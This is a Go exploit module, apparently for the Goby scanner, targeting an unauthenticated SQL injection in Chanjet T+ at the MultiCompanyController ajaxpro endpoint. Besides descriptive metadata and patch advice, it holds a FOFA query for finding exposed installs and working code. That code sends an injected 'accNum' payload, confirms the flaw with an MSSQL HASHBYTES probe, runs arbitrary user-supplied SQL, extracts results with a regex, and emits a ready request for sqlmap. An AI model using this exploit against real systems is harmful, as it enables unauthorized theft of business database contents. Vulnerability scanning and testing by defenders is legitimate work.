package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Chanjet TPlus /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController.Ufida.T.SM.UIP.ashx SQL Injection Vulnerability",
    "Description": "<p>Chanjet TPlus is a new type of enterprise management software based on the Internet, the function modules include: financial management, procurement management, inventory management and so on. Mainly for the financial business integration application of small and medium-sized industry and trade enterprises, integrating social, mobile, Internet of things, e-commerce, Internet information subscription and other elements. </p><p> The Ufida, T.S M.U IP MultiCompanyController, Ufida, T.S M.U IP. Ashx interface without external input SQL statements to the strict check and filter, directly to the database, This allows an unauthenticated remote attacker to exploit SQL injection vulnerabilities to gain access to information in the database.</p>",
    "Product": "Chanjet-TPlus",
    "Homepage": "https://www.chanjet.com/",
    "DisclosureDate": "2023-05-17",
    "PostTime": "2024-08-08",
    "Author": "hhh3156",
    "FofaQuery": "(title=\"畅捷通 T+\" && body=\"/view/login.htm\") || body=\"tplus\"",
    "GobyQuery": "(title=\"畅捷通 T+\" && body=\"/view/login.htm\") || body=\"tplus\"",
    "Level": "2",
    "Impact": "<p>The Ufida, T.S M.U IP MultiCompanyController, Ufida, T.S M.U IP. Ashx interface without external input SQL statements to the strict check and filter, directly to the database, This allows an unauthenticated remote attacker to exploit SQL injection vulnerabilities to gain access to information in the database.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "(SELECT (db_name()))",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "畅捷通T+ /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController.Ufida.T.SM.UIP.ashx SQL 注入漏洞",
            "Product": "畅捷通-TPlus",
            "Description": "<p>畅捷通 T+ 是一款基于互联网的新型企业管理软件，功能模块包括：财务管理、采购管理、库存管理等。主要针对中小型工贸和商贸企业的财务业务一体化应用，融入了社交化、移动化、物联网、电子商务、互联网信息订阅等元素。<br></p><p>其Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx接口没有对外部输入的SQL语句进行严格的校验和过滤，直接带入数据库执行，导致未经身份验证的远程攻击者可以利用SQL注入漏洞获取数据库中的信息。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>其Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx接口没有对外部输入的SQL语句进行严格的校验和过滤，直接带入数据库执行，导致未经身份验证的远程攻击者可以利用SQL注入漏洞获取数据库中的信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Chanjet TPlus /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController.Ufida.T.SM.UIP.ashx SQL Injection Vulnerability",
            "Product": "Chanjet-TPlus",
            "Description": "<p>Chanjet TPlus is a new type of enterprise management software based on the Internet, the function modules include: financial management, procurement management, inventory management and so on. Mainly for the financial business integration application of small and medium-sized industry and trade enterprises, integrating social, mobile, Internet of things, e-commerce, Internet information subscription and other elements.&nbsp;</p><p>&nbsp;The Ufida, T.S M.U IP MultiCompanyController, Ufida, T.S M.U IP. Ashx interface without external input SQL statements to the strict check and filter, directly to the database, This allows an unauthenticated remote attacker to exploit SQL injection vulnerabilities to gain access to information in the database.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The Ufida, T.S M.U IP MultiCompanyController, Ufida, T.S M.U IP. Ashx interface without external input SQL statements to the strict check and filter, directly to the database, This allows an unauthenticated remote attacker to exploit SQL injection vulnerabilities to gain access to information in the database.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9933"
}`

	setSqlPayloadHash_fsopLAFKVM9d36d5m := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = data
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		urlget := `/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex`
		data := `{"accNum": "6' AND 965 IN ` + sql + `--+", "functionTag": "SYS0104", "url": ""}`
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Referer":         hostInfo.FixedHostInfo,
		}
		resp, err = setPostRequest(hostInfo, urlget, data, header)
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}

		//配置漏洞存在的路径
		vulurl = "/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			MD5 := func(v string) string {
				d := []byte(v)
				m := md5.New()
				m.Write(d)
				return hex.EncodeToString(m.Sum(nil))
			}
			randomString := goutils.RandomHexString(8)

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := MD5(randomString)

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `(SELECT (sys.fn_sqlvarbasetostr(HASHBYTES('MD5',CONVERT(varCHAR(8),'` + randomString + `')))))`

			sendPayload := setSqlPayloadHash_fsopLAFKVM9d36d5m

			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil || !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			// 1.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25\nContent-Length: 150\nContent-Type: application/x-www-form-urlencoded\n\n{\"accNum\": \"6' AND 965 IN (SELECT (sys.fn_sqlvarbasetostr(HASHBYTES('MD5',CONVERT(varCHAR(8),'4dea19aE')))))--+\", \"functionTag\": \"SYS0104\", \"url\": \"\"}"

			// 2.配置正则语句，从响应包中提取出数据
			regular := ` '([\s\S]*?)' `

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadHash_fsopLAFKVM9d36d5m
			attacktype := goutils.B2S(ss.Params["attackType"])

			switch attacktype {

			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed` + err.Error()
					expResult.Success = false
					return expResult
				}

				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "Exploitation failed "
					return expResult
				}
				expResult.Success = true
				expResult.Output = output

			case "sqlpoint":
				expResult.Success = true
				expResult.Output = sqlpoint

			default:
				expResult.Success = false
				expResult.Output = "Unknown attack type"

			}
			return expResult
		},
	))
}
